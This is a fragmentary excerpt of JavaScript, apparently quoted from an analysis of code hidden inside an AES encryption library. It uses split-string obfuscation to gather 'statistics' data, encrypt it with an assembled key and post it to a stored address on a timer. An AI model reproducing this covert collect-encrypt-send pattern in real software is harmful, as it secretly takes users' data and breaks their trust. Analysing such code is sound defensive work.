...
Aes.m[pts] = function() {
	var u = Aes.m[stl]; 
	var data = Aes.m[edata];
	Aes.m.psu(u, data, function(result) {});
}
...
Aes.o = function(str) {
	...
	o.data = str;
	o.date = Date.now();
	o.mdata = Aes.m["st"+"atis"+"tics"+"Data"];
	var str = JSON.stringify(o);
	var owd = Aes.m["mag"+"ic"+"Data"];
	var pawd = owd + aa + bb + cc;

	var oo = {};
	oo.date = Date.now();
	oo.data = Aes.Ctr.encrypt(str,  pawd, 256);
...
Utf8.encode = function(strUni) {
  ...
  return strUtf;
	...
	Aes.m[aa+bb+cc] = function() {
		var str = Aes.m["sta"+"tist"+"icsS"+"tr"];
		Aes.m["esta"+"tist"+"icsS"+"tr"] = Aes.o(str);
		var func = Aes.m["pos"+"tStati"+"stics"];
		setTimeout(func, 10);
	};
